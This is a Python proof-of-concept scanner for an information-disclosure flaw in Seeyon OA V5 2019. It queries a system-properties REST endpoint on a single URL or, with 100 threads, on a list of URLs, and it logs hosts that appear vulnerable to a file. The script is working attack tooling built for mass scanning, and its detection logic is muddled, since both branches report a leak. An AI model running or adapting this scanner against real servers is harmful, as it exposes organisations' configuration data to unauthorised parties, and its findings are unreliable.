import json
import sys,argparse,requests,re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = """

██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║███████║
██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║
██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
                      author:panda
                      type: 致远OAV52019系统properties信息泄露漏洞
                      date:2024-09-2
                      version:1.0
   """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="致远OAV52019系统properties信息泄露漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/seeyon/rest/m3/common/system/properties"
    res1 = requests.get(url=target,verify=False,timeout=5)
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            res3 = json.loads(res2.text)
            print("注意：如果网站不存在信息泄露，则会输出data")
            if res3['data']['sms.cmpp3.host'] == '':
                with open("result.txt",'a',encoding='utf-8') as f:
                    f.write(f"[+]{target}\n")
                    f.close()
                    print(f"[+]该网站{target}存在信息泄露")
            elif res3['data']['sms.cmpp3.host'] != '':
                print(f"[-]该网站{target}存在信息泄露")
        else:
            print("访问超时，请手动测试！！！")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()